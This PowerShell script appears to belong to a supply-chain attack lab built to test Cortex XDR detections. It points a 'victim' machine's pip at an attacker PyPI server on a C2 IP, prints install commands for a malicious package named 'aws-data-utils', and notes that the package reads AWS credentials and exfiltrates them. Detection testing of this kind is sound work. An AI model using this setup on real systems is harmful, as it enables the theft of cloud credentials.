# Setup Victim Endpoint (Windows Version)
# Configure victim endpoint to use attacker's PyPI server

param(
    [Parameter(Mandatory=$true)]
    [string]$C2_IP
)

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "  Victim Endpoint Configuration" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[*] Configuring pip to use attacker PyPI: http://${C2_IP}:8080/simple/" -ForegroundColor Yellow
Write-Host ""

# Get script directory
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location $ScriptDir

# Create pip.conf for this project
$PipDir = Join-Path $ScriptDir ".pip"
New-Item -ItemType Directory -Force -Path $PipDir | Out-Null

$PipConf = @"
[global]
extra-index-url = http://${C2_IP}:8080/simple/
trusted-host = ${C2_IP}
"@

Set-Content -Path (Join-Path $PipDir "pip.conf") -Value $PipConf

Write-Host "[+] Created local pip configuration: .pip\pip.conf" -ForegroundColor Green
Write-Host ""
Write-Host "To install dependencies with malicious package:" -ForegroundColor Yellow
Write-Host "  `$env:PIP_CONFIG_FILE = `"$(Join-Path $ScriptDir '.pip\pip.conf')`""
Write-Host "  pip install -r requirements.txt"
Write-Host ""
Write-Host "OR use direct command:" -ForegroundColor Yellow
Write-Host "  pip install --index-url http://${C2_IP}:8080/simple/ --trusted-host ${C2_IP} aws-data-utils"
Write-Host ""

# Save C2 IP for later use
Set-Content -Path (Join-Path $ScriptDir ".c2_server_ip") -Value $C2_IP

Write-Host "[SUCCESS] Victim endpoint configured!" -ForegroundColor Green
Write-Host ""
Write-Host "WARNING - CORTEX XDR NOTE:" -ForegroundColor Yellow
Write-Host "  The following actions should trigger XDR detections:" -ForegroundColor Yellow
Write-Host "  1. pip install connecting to unusual IP" -ForegroundColor Yellow
Write-Host "  2. Python accessing %USERPROFILE%\.aws\credentials during install" -ForegroundColor Yellow
Write-Host "  3. Outbound connection to C2 server during install" -ForegroundColor Yellow
Write-Host "  4. Python importing package (runtime exfiltration)" -ForegroundColor Yellow
Write-Host ""
